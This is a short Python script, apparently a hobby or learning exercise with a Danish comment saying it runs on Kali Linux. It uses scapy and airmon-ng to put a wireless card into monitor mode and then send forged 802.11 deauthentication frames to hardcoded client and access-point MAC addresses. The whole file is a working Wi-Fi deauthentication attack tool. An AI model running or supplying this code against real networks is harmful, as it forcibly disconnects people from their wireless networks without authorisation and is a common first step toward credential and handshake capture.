"""
Skal køres via Kali linux -- kræver at interfacet er i monitor mode i forvejen lige pt.

@@airmon-ng wlan0 start@@
done.

"""
import time
from scapy.all import *
from subprocess import call
from subprocess import check_output


iface = "wlan0mon"
timeout = 1
dest = "94:65:2D:D8:2E:16"
bssid = "40:F2:01:9A:42:56"



def setMonitorMode():
	checkphrase_mon_success = "monitor mode vif enabled"
	checkphrase_mon = "Mode:Monitor"

	moncheck = check_output(["iwconfig"],stderr=subprocess.PIPE).decode("UTF-8") #stderr=subprocess.PIPE simply "silences" the output.

	if checkphrase_mon in moncheck:
		print("wlan0mon is already in Monitor Mode!")

	else:
		airmoncheck = check_output(["airmon-ng", "start", "wlan0"],stderr=subprocess.PIPE).decode("UTF-8")
		if checkphrase_mon_success in airmoncheck:
			print("Sucessfully set wlan0 to Monitor Mode (now called wlan0mon)!")
		else:
			print("wlan0 has not entered Monitor Mode, recheck.")



def perform_deauth_attack(interface,dest,bssid,amount):
	"""
	interface, is the wireless interface
	destination is the target we wish to deuath
	bssid is the mac address of the AP. (string, MAC)

	:param interface:
	:param dest:
	:param bssid:
	:return:
	"""
	radio_p = RadioTap()
	dot11_frame = Dot11(subtype=0xc,addr1=dest,addr2=bssid,addr3=bssid) #0xc is hex for 12, and 1100 in integer (deuath sub type value)
	deauth = Dot11Deauth(reason=3) #reason list, see 802.11 deauth reason codes,
	# https://community.cisco.com/t5/wireless-mobility-documents/802-11-association-status-802-11-deauth-reason-codes/ta-p/3148055
	frame = radio_p/dot11_frame/deauth

	hexdump(frame)
	ls(frame)
	frame.summary()
	frame.pdfdump()
	sendp(frame,iface=interface, count=amount,inter=0.02) #'wlan0mon'


setMonitorMode()
perform_deauth_attack(iface,dest,bssid,1)
